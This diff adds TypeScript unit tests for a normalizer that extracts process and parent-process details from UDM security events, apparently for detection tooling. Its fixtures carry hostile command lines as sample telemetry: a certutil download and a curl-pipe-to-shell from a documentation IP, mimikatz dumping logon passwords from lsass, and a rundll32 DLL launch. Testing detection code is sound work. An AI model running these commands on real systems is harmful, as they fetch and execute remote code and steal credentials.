@@ -359,3 +359,137 @@ describe("UdmNormalizer", () => {
     });
   });
 });
+
+/*
+ * A UDM PROCESS_* event is about its target process; in a PROCESS_LAUNCH
+ * the principal's process started it. Any other event is about the
+ * principal's process. Both spellings of every key are read.
+ */
+describe("UdmNormalizer: the process an event is about", () => {
+  test("a PROCESS_LAUNCH: the target's process, and the principal's as its parent", () => {
+    const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
+      metadata: { event_type: "PROCESS_LAUNCH" },
+      principal: {
+        hostname: "wkstn-042",
+        process: {
+          pid: "4120",
+          file: { full_path: "C:\\Windows\\explorer.exe" },
+          command_line: "C:\\Windows\\Explorer.EXE",
+        },
+      },
+      target: {
+        process: {
+          pid: "6532",
+          file: { full_path: "C:\\Windows\\System32\\certutil.exe" },
+          command_line: "certutil.exe -urlcache -f http://203.0.113.7/a.exe",
+          parent_process: { pid: "4120" },
+        },
+      },
+    });
+
+    expect(result.processName).toBe("certutil.exe");
+    expect(result.processPath).toBe("C:\\Windows\\System32\\certutil.exe");
+    expect(result.processCommandLine).toBe(
+      "certutil.exe -urlcache -f http://203.0.113.7/a.exe",
+    );
+    expect(result.parentProcessName).toBe("explorer.exe");
+    expect(result.parentProcessPath).toBe("C:\\Windows\\explorer.exe");
+    expect(result.parentProcessCommandLine).toBe("C:\\Windows\\Explorer.EXE");
+    // principalProcess keeps the principal's path, as it always has.
+    expect(result.principalProcess).toBe("C:\\Windows\\explorer.exe");
+  });
+
+  test("the camelCase spelling of the Chronicle API reads the same", () => {
+    const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
+      metadata: { eventType: "PROCESS_LAUNCH" },
+      principal: {
+        process: {
+          file: { fullPath: "/usr/sbin/cron" },
+          commandLine: "/usr/sbin/CRON -f",
+        },
+      },
+      target: {
+        process: {
+          file: { fullPath: "/usr/bin/sh" },
+          commandLine: "/bin/sh -c curl -s http://203.0.113.7/x | sh",
+          parentProcess: { file: { fullPath: "/usr/sbin/cron" } },
+        },
+      },
+    });
+
+    expect(result.processPath).toBe("/usr/bin/sh");
+    expect(result.processName).toBe("sh");
+    expect(result.processCommandLine).toBe(
+      "/bin/sh -c curl -s http://203.0.113.7/x | sh",
+    );
+    expect(result.parentProcessPath).toBe("/usr/sbin/cron");
+    expect(result.parentProcessCommandLine).toBe("/usr/sbin/CRON -f");
+  });
+
+  test("a PROCESS_OPEN: the principal opened the process, it is not its parent", () => {
+    const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
+      metadata: { event_type: "PROCESS_OPEN" },
+      principal: {
+        process: {
+          file: { full_path: "C:\\Users\\Public\\mimikatz.exe" },
+          command_line: "mimikatz.exe sekurlsa::logonpasswords",
+        },
+      },
+      target: {
+        process: {
+          file: { full_path: "C:\\Windows\\System32\\lsass.exe" },
+          parent_process: {
+            file: { full_path: "C:\\Windows\\System32\\wininit.exe" },
+          },
+        },
+      },
+    });
+
+    expect(result.processName).toBe("lsass.exe");
+    expect(result.parentProcessName).toBe("wininit.exe");
+    expect(result.parentProcessCommandLine).toBe("");
+  });
+
+  test.each(["NETWORK_CONNECTION", "FILE_CREATION", "PROCESS_MODULE_LOAD"])(
+    "a %s is about the principal's process, with its parent",
+    (eventType: string) => {
+      const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
+        metadata: { event_type: eventType },
+        principal: {
+          process: {
+            file: { full_path: "C:\\Windows\\System32\\rundll32.exe" },
+            command_line: "rundll32.exe C:\\Users\\Public\\x.dll,Start",
+            parent_process: {
+              file: { full_path: "C:\\Windows\\System32\\cmd.exe" },
+              command_line: "cmd.exe /c rundll32 x.dll,Start",
+            },
+          },
+        },
+        target: {
+          process: { file: { full_path: "C:\\Users\\Public\\x.dll" } },
+        },
+      });
+
+      expect(result.processPath).toBe("C:\\Windows\\System32\\rundll32.exe");
+      expect(result.processCommandLine).toBe(
+        "rundll32.exe C:\\Users\\Public\\x.dll,Start",
+      );
+      expect(result.parentProcessName).toBe("cmd.exe");
+      expect(result.parentProcessCommandLine).toBe(
+        "cmd.exe /c rundll32 x.dll,Start",
+      );
+    },
+  );
+
+  test("a USER_LOGIN with no process names none", () => {
+    const result: NormalizedSecurityEvent = UdmNormalizer.normalize({
+      metadata: { event_type: "USER_LOGIN" },
+      principal: { ip: ["203.0.113.7"] },
+      target: { user: { userid: "alice" } },
+    });
+
+    expect(result.processName).toBe("");
+    expect(result.processCommandLine).toBe("");
+    expect(result.parentProcessName).toBe("");
+  });
+});
